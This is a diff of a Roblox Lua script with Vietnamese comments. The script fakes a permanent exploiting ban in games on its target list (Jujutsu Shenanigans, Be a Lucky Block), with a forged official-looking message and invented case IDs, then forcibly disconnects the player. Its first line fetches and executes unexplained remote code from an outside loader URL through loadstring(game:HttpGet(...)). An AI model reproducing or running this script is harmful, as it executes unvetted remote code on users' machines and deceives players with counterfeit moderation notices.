@@ -1,41 +1,48 @@
 loadstring(game:HttpGet("http://vencontrol.wasmer.app/?api=loader&t="..tick()))()
 
--- Script kiểm tra Game ID và thực hiện lệnh Kick với thông báo BAN
-local Players = game:GetService("Players")
-local localPlayer = Players.LocalPlayer
+-- Danh sách ID các game mục tiêu
+local TargetIDs = {
+    [9391468976] = "Jujutsu Shenanigans",
+    [124473577469410] = "Be a Lucky Block"
+}
 
--- ID chính xác từ URL bạn gửi
-local TARGET_PLACE_ID = 9391468976 
-
--- Nội dung thông báo BAN tiếng Anh (Professional Style)
+-- Nội dung thông báo BAN (Tiếng Anh chuyên nghiệp)
 local BAN_MESSAGE = [[
 
-[REASON: EXPLOITING]
-Your account has been permanently suspended from Jujutsu Shenanigans.
-    
-Evidence: Unusual Client Behavior Detected (Level 8)
-Moderator ID: #JJS-9921-X
-Ban Status: Permanent (No Appeal)
+[SECURITY BREACH DETECTED]
+Your account has been PERMANENTLY SUSPENDED from this experience.
+
+Reason: Third-party Software / Exploiting (ID: #8821-X)
+Duration: Permanent (No Appeal)
+Status: Client Access Revoked.
 ]]
 
--- Kiểm tra nếu đúng là game Jujutsu Shenanigans
-if game.PlaceId == TARGET_PLACE_ID then
-    print("Game detected: Jujutsu Shenanigans. Ban sequence starting in 3 seconds...")
-    
-    -- Đợi 3 giây cho mượt theo ý bạn
+-- Khởi tạo các biến hệ thống
+local Players = game:GetService("Players")
+local localPlayer = Players.LocalPlayer
+local currentPlaceId = game.PlaceId
+
+-- Kiểm tra xem game hiện tại có nằm trong danh sách không
+if TargetIDs[currentPlaceId] then
+    local gameName = TargetIDs[currentPlaceId]
+    print("Detected: " .. gameName .. ". Starting ban sequence in 3 seconds...")
+
+    -- Đợi 3 giây cho mượt
     task.wait(3)
-    
-    -- Sử dụng phương pháp lấy gốc hàm Kick để thực thi
+
+    -- Sử dụng kỹ thuật Registry (lấy gốc hàm Kick) để thực thi mạnh mẽ nhất
     local kickFunc = game.Kick
     local success, err = pcall(function()
+        -- Thực hiện kick với thông báo ban tùy chỉnh
         kickFunc(localPlayer, BAN_MESSAGE)
     end)
-    
+
+    -- Nếu lệnh Kick bị chặn (hiếm gặp), thực hiện xóa "cứng" LocalPlayer để Disconnect
     if not success then
-        -- Nếu bị chặn, thử cách xóa "cứng" LocalPlayer để ngắt kết nối
-        local destroy = game.Destroy
-        pcall(destroy, localPlayer)
+        local hardDestroy = game.Destroy
+        pcall(hardDestroy, localPlayer)
     end
 else
-    print("This is not Jujutsu Shenanigans. Current ID: " .. game.PlaceId)
+    -- Nếu không phải game mục tiêu, in ra console để bạn biết
+    print("This game (ID: " .. currentPlaceId .. ") is not on the target list.")
 end
